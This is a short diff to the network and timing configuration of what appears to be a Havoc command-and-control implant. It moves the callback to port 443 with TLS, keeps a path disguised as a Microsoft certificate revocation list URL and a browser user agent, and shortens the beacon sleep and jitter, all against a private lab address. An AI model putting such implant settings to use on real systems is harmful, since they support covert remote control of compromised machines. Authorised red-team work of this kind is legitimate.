@@ -3,16 +3,16 @@
 // NETWORK CONFIGURATION (from Havoc Listener)
 // =============================================================================
 #define CONFIG_HOST         L"192.168.56.101"
-#define CONFIG_PORT         80
-#define CONFIG_SECURE       FALSE
+#define CONFIG_PORT         443
+#define CONFIG_SECURE       TRUE
 #define CONFIG_ENDPOINT     L"/pki/mscorp/crl/msitwww1.crl"
 #define CONFIG_USER_AGENT    L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 
 // =============================================================================
 // TIMING CONFIGURATION (from Havoc Agent Settings)
 // =============================================================================
-#define CONFIG_SLEEP        10000   // milliseconds
-#define CONFIG_JITTER       20     // percentage (0-100)
+#define CONFIG_SLEEP        3000   // milliseconds
+#define CONFIG_JITTER       3     // percentage (0-100)
 
 // =============================================================================
 // HTTP HEADERS (from Havoc Listener Profile)
